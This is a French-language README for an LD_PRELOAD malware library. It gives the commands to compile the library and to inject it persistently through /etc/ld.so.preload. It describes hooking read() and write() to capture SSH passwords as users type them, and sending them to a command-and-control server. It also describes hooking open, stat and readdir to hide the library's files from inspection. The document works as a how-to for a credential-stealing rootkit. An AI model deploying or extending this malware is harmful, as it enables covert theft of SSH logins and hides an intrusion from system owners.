# Malware LD_PRELOAD

Ce malware utilise la variable d'environnement `LD_PRELOAD` pour intercepter des fonctions de programmes légitimes et en modifier le comportement afin de :

- Récupérer les identifiants SSH saisis par la victime.
- Cacher les fichiers sensibles capables de révéler la présence du malware.

## Compilation

- Avec le script :
```bash
./compile.sh
```

- Manuellement :
```bash
gcc hook_open.c hook_ssh.c preload.h sendc2.c -fPIC -shared -o fakelib.so
```

## Utilisation

- Injection système (persistante) :
```bash
echo "$PWD/fakelib.so" > /etc/ld.so.preload
```

- Injection locale (temporaire) — ne fonctionne pas avec les programmes SUID :
```bash
export LD_PRELOAD=$PWD/fakelib.so
```

Pour désactiver :
```bash
unset LD_PRELOAD
```

## Exfiltration des identifiants SSH

Une fois le fichier `ld.so.preload` configuré avec notre bibliothèque, toute commande SSH exécutée par la victime est automatiquement interceptée.  
Le hook cible principalement la fonction `read()` pour capturer les mots de passe au moment où l’utilisateur les saisit.

Dès qu’un identifiant est récupéré, il est vérifié, puis envoyé vers une infrastructure de command and control (C2) sous le format suivant :

```
command username@ip password
```

### Méthode de détection du contexte SSH

Le hook SSH met en place plusieurs vérifications pour éviter de capturer des données hors contexte :

- Vérifie que le processus actif est bien `ssh` via le contenu de `/proc/self/comm`
- Utilise `isatty()` pour s'assurer que le terminal est interactif
- Les fonctions `read()` et `write()` sont redéfinies pour capturer les flux entre l'utilisateur et le binaire SSH

## Defense Evasion

Le malware redéfinit plusieurs fonctions système (`open`, `stat`, `access`, `readdir`, etc.) pour empêcher la détection de fichiers critiques comme `/etc/ld.so.preload`.

Cela permet de dissimuler la présence de la bibliothèque injectée en bloquant l’accès ou l’affichage de ces fichiers dans les commandes Unix classiques (`ls`, `cat`, `more`, etc.).

Même si un utilisateur tente d’inspecter manuellement le système, le hook empêche l'affichage ou l'ouverture des fichiers ciblés, rendant le malware beaucoup plus difficile à repérer.
